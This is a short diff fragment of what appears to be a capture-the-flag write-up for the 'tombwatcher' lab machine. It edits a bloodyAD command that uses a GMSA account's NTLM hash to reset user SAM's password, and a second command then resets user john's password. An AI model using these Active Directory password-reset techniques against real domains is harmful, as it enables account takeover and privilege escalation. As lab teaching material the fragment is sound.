@@ -93,7 +93,7 @@ Change Passwords via GMSA: Utilize bloodyAD to change the passwords for the SAM 
 Bash
 
 ```
-bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc…' set password SAM 'jhvc@4569@'
+bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u 'ansible_dev$' -p ':4b21348ca4ay…' set password SAM 'jhvc@4569@'
 ```
 ```
 bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u SAM -p 'jhvc@4569@' set password john 'jhvc@4569@'
